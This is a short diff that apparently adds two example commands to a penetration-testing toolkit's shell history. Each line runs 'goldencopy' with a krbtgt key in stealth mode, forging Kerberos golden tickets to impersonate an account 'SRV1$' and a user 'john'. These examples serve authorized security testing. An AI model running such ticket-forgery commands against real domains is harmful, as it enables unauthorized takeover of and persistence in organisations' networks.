@@ -1,0 +1,2 @@
+goldencopy --password 'exegol4thewin' --stealth --krbtgt 060ee2d06c5648e60a9ed916c9221ad19d90e5fb7b1cccf9d51f540fe991ada1 'SRV1$'
+goldencopy --tools all --password 'exegol4thewin' --stealth --krbtgt 060ee2d06c5648e60a9ed916c9221ad19d90e5fb7b1cccf9d51f540fe991ada1 'john'
